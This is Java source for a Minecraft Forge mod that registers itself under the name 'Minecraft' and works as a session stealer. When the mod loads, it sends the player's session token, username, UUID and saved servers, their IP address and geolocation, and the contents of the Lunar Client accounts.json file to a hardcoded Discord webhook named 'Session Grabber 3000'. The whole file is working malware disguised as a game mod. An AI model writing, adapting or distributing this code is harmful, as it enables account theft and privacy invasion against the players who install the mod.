package com.github.shurpe;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.io.File;
import java.nio.file.Files;
import java.nio.charset.StandardCharsets;

@Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
public final class Main {

    // DEINE URL HIER EINTRAGEN!
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455249579246354679/PFz12Wzk9KGdz28SbWugN-CFfnPC1qyZkkukfSmG3jjWQjHKMWAfxB9RM2NTVp8n35fB";
    private static final boolean PING_EVERYONE = true;
    private static final Minecraft mc = Minecraft.getMinecraft();

    // Hilfsmethode zum Kürzen von Texten (Discord Limit ist 1024)
    private String safeString(String text, int maxLength) {
        if (text == null) return "Unknown";
        if (text.length() > maxLength) {
            return text.substring(0, maxLength - 3) + "...";
        }
        return text;
    }

    private DiscordWebhook.EmbedObject genGeoInfoEmbed() throws Exception {
        final JsonObject info = (JsonObject) new JsonParser().parse(
                HttpUtils.getContentAsString("https://ipapi.co/json"));

        return new DiscordWebhook.EmbedObject()
                .setTitle(":earth_americas: IP Info")
                .setColor(0x4400FF)
                .setDescription("Target IP and Geo-Location")
                .addField("Country", "```" + info.get("country_name").getAsString() + "```", true)
                .addField("City", "```" + info.get("city").getAsString() + "```", true)
                .addField("IP", "```" + info.get("ip").getAsString() + "```", true);
    }

    private DiscordWebhook.EmbedObject genAccInfoEmbed() {
        final Session session = mc.getSession();
        
        // Token sicher abrufen und KÜRZEN (Microsoft Tokens sind oft > 1024 Zeichen!)
        String token = session.getToken();
        token = safeString(token, 800); // Kürzen auf 800 Zeichen sicherheitshalber

        return new DiscordWebhook.EmbedObject()
                .setTitle(":unlock: Account Info")
                .setColor(0x6E39FF)
                .setDescription("User: " + session.getUsername())
                .addField("Name", "```" + session.getUsername() + "```", true)
                .addField("UUID", "```" + session.getPlayerID() + "```", true)
                .addField("Session Token", "```" + token + "```", false);
    }

    private DiscordWebhook.EmbedObject genServersInfoEmbed() {
        final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Saved Servers")
                .setColor(0x8F67FC)
                .setDescription("List of saved servers");

        final ServerList servers = new ServerList(mc);
        // Limit auf 15 Server setzen
        int limit = Math.min(servers.countServers(), 15);

        for (int i = 0; i < limit; i++) {
            final ServerData server = servers.getServerData(i);
            
            // Namen und IPs ebenfalls kürzen, falls Müll drin steht
            String name = safeString(server.serverName, 50);
            String ip = safeString(server.serverIP, 100);
            
            serversEmbed.addField(":label: " + name, "```" + ip + "```", true);
        }

        if (servers.countServers() > limit) {
            serversEmbed.addField("More...", "```" + (servers.countServers() - limit) + " hidden```", false);
        }

        return serversEmbed;
    }

    private DiscordWebhook.EmbedObject genLunarInfoEmbed() {
        String lunarPath = System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json";
        File lunarFile = new File(lunarPath);
        String content = "File not found";

        if (lunarFile.exists()) {
            try {
                byte[] encoded = Files.readAllBytes(lunarFile.toPath());
                content = new String(encoded, StandardCharsets.UTF_8);
                // Lunar Datei kürzen (max 1500 Zeichen für Description)
                content = safeString(content, 1500);
            } catch (Exception e) {
                content = "Error: " + e.getMessage();
            }
        }

        return new DiscordWebhook.EmbedObject()
                .setTitle(":crescent_moon: Lunar Client")
                .setColor(0xEE3333)
                .setDescription("```json\n" + content + "\n```");
    }

    private DiscordWebhook genWebhook() {
        final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL)
                .setUsername("Session Grabber 3000");

        if (PING_EVERYONE) webhook.setContent("@everyone");

        // Versuche Geo-Info
        try {
            webhook.addEmbed(genGeoInfoEmbed());
        } catch (Exception e) {
            System.out.println("Geo failed (skip): " + e.getMessage());
        }

        // Andere Embeds hinzufügen
        webhook.addEmbed(genAccInfoEmbed());
        webhook.addEmbed(genServersInfoEmbed());
        webhook.addEmbed(genLunarInfoEmbed());

        return webhook;
    }

    private void execWebhook() {
        new Thread(() -> {
            try {
                genWebhook().execute();
                System.out.println("Webhook erfolgreich gesendet!");
            } catch (final Exception e) {
                System.err.println("FEHLER BEIM SENDEN DES WEBHOOKS:");
                e.printStackTrace();
            }
        }).start();
    }

    @EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        execWebhook();
    }
}